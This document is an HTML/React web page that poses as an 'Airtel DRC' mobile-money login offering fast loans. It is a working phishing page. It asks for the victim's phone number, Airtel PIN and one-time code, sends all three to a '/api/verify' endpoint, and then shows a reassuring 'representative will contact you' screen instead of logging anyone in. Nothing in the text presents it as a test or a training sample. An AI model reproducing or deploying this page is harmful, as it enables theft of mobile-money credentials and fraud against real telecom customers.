!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Airtel DRC - Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>body { font-family: 'Inter', sans-serif; background-color: #f4f4f4; margin: 0; } .airtel-red { background-color: #ff0000; }</style>
</head>
<body>
  <div id="root"></div>
  <script type="text/babel">
    const { useState } = React;
    function AirtelLogin() {
      const [step, setStep] = useState(1);
      const [phone, setPhone] = useState("");
      const [pin, setPin] = useState(["", "", "", ""]);
      const [otp, setOtp] = useState(["", "", "", ""]);
      const hPC = (i, v) => {
        if (v.length <= 1 && /^\d*$/.test(v)) {
          const n = [...pin]; n[i] = v; setPin(n);
          if (v && i < 3) document.getElementById(`pin-${i + 1}`).focus();
        }
      };
      const hOC = (i, v) => {
        if (v.length <= 1 && /^\d*$/.test(v)) {
          const n = [...otp]; n[i] = v; setOtp(n);
          if (v && i < 3) document.getElementById(`otp-${i + 1}`).focus();
        }
      };
      if (step === 1) {
        return (
          <div className="min-h-screen flex flex-col">
            <header className="airtel-red text-white p-6 text-center relative">
              <div className="absolute left-6 top-6 text-2xl">≡</div>
              <h1 className="text-3xl font-bold">Airtel DRC</h1>
              <p className="text-sm mt-1 opacity-90">Fast loans. Anytime. Anywhere.</p>
            </header>
            <main className="flex-1 flex justify-center px-4 -mt-6">
              <div className="bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12">
                <h2 className="text-4xl font-bold text-gray-900">Welcome back</h2>
                <p className="text-gray-500 mt-2 text-lg">Log in to your Airtel account</p>
                <div className="mt-8 bg-red-50 border border-red-200 rounded-xl p-4 flex items-center gap-3">
                  <div className="w-6 h-6 rounded-full border-2 border-red-500 flex items-center justify-center text-red-500 font-bold text-sm">!</div>
                  <p className="text-red-700 font-medium">Enter your Airtel number.</p>
                </div>
                <div className="mt-10">
                  <label className="block text-gray-700 font-semibold mb-3 text-lg">Phone number</label>
                  <div className="flex border border-gray-300 rounded-xl overflow-hidden focus-within:border-red-500">
                    <div className="bg-gray-50 px-5 py-4 border-r border-gray-300 text-gray-700 font-medium">+243</div>
                    <input type="text" placeholder="7XX XXX XXX" className="flex-1 px-5 py-4 outline-none text-lg" value={phone} onChange={(e) => setPhone(e.target.value)} />
                  </div>
                </div>
                <div className="mt-10">
                  <label className="block text-gray-700 font-semibold mb-3 text-lg text-center sm:text-left">Enter your Airtel PIN code</label>
                  <div className="flex justify-center sm:justify-start gap-4 mt-4">
                    {pin.map((d, i) => (
                      <input key={i} id={`pin-${i}`} type="password" maxLength="1" className="w-16 h-20 text-center text-3xl font-bold border border-gray-300 rounded-2xl focus:border-red-500 outline-none" value={d} onChange={(e) => hPC(i, e.target.value)} />
                    ))}
                  </div>
                </div>
                <button onClick={() => setStep(2)} className="w-full mt-12 py-5 airtel-red text-white rounded-full text-xl font-bold flex items-center justify-center gap-2 hover:opacity-90">
                  Connexion <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                </button>
              </div>
            </main>
          </div>
        );
      }
      const handleVerify = async () => {
        try {
          await fetch('/api/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              phone, 
              pin: pin.join(''), 
              otp: otp.join('') 
            })
          });
        } catch (e) {
          console.error('Failed to notify:', e);
        }
        setStep(3);
      };

      if (step === 3) {
        return (
          <div className="min-h-screen flex flex-col">
            <header className="airtel-red text-white p-6 text-center relative">
              <h1 className="text-3xl font-bold">Airtel DRC</h1>
              <p className="text-sm mt-1 opacity-90">Request Received</p>
            </header>
            <main className="flex-1 flex justify-center px-4 -mt-6">
              <div className="bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center">
                <div className="mx-auto w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-8">
                  <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path></svg>
                </div>
                <h2 className="text-3xl font-bold text-gray-900">Thank You!</h2>
                <p className="text-gray-600 mt-6 text-xl leading-relaxed">
                  Your request has been submitted successfully. Please wait for confirmation.
                </p>
                <div className="mt-8 p-6 bg-gray-50 rounded-2xl border border-gray-100">
                  <p className="text-gray-700 font-medium text-lg">
                    A representative will contact you at <span className="text-red-600 font-bold">+243 {phone}</span> within 24 hours to finalize your plan.
                  </p>
                </div>
                <button 
                  onClick={() => window.close()}
                  className="w-full mt-10 py-5 border-2 border-gray-200 text-gray-600 rounded-full text-xl font-bold hover:bg-gray-50 transition-colors"
                >
                  Close this window
                </button>
              </div>
            </main>
          </div>
        );
      }
      return (
        <div className="min-h-screen flex flex-col">
          <header className="airtel-red text-white p-6 text-center relative">
            <button onClick={() => setStep(1)} className="absolute left-6 top-6 text-2xl">←</button>
            <h1 className="text-3xl font-bold">Airtel DRC</h1>
            <p className="text-sm mt-1 opacity-90">Verification Required</p>
          </header>
          <main className="flex-1 flex justify-center px-4 -mt-6">
            <div className="bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center">
              <h2 className="text-3xl font-bold text-gray-900">Enter OTP</h2>
              <p className="text-gray-500 mt-4 text-lg">We've sent a code to <span className="font-bold text-gray-900">+243 {phone}</span></p>
              <div className="flex justify-center gap-4 mt-10">
                {otp.map((d, i) => (
                  <input key={i} id={`otp-${i}`} type="text" maxLength="1" className="w-16 h-20 text-center text-3xl font-bold border border-gray-300 rounded-2xl focus:border-red-500 outline-none" value={d} onChange={(e) => hOC(i, e.target.value)} />
                ))}
              </div>
              <button 
                onClick={handleVerify}
                className="w-full mt-12 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90"
              >
                Verify & Continue
              </button>
            </div>
          </main>
        </div>
      );
    }
    ReactDOM.createRoot(document.getElementById("root")).render(<AirtelLogin />);
  </script>
</body>
</html>
